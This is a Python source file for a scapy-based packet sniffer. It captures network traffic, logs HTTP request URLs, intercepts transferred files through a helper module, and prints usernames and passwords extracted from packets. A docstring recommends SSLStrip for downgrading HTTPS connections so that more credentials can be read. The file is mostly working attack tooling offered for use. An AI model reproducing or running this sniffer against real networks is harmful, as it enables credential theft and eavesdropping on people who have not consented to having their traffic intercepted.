import scapy.all as scapy

from scapy.layers import http
from scapy.layers.l2 import Ether

from fileinterceptor import FileInterceptor
from logininfo import LoginInfo

from windows import Windows
from linux import Linux

from system import system_other_than_error
from system import System

from colorama import Fore
from colorama import init

import platform


class PacketSniffer:

    @classmethod
    def start(cls, /) -> None:
        if not (system := os.get(platform.system(), None)):
            system_other_than_error()

        system.run_sniffer()

    @classmethod
    def sniff(cls, interface: str):
        scapy.sniff(
            iface=interface,
            store=False,
            prn=PacketSniffer._process_sniffed_packet
        )

    @staticmethod
    def _get_url(packet):
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

    @classmethod
    def _process_sniffed_packet(cls, packet: Ether, /):
        '''
        If website use HTTPS, you can use SSLStrip to 'change' HTTPS to HTTP
        See more: https://github.com/moxie0/sslstrip
        '''
        FileInterceptor.http_intercept(packet)

        if packet.haslayer(http.HTTPRequest):

            url = PacketSniffer._get_url(packet)
            print(f'{Fore.GREEN}[+] HTTP REQUEST: {url.decode()}')

            if login_info := LoginInfo.get_info(packet):
                print(f'{Fore.YELLOW}[?] POSSIBLE USERNAME AND PASSWORD: {login_info}')


os: dict[str, System] = {
    'Windows': Windows,
    'Linux': Linux
}

def main() -> None:
    if not (system := os.get(platform.system(), None)):
        system_other_than_error()

    PacketSniffer.sniff(system.get_interface())


if __name__ == '__main__':
    init(autoreset=True)
    main()
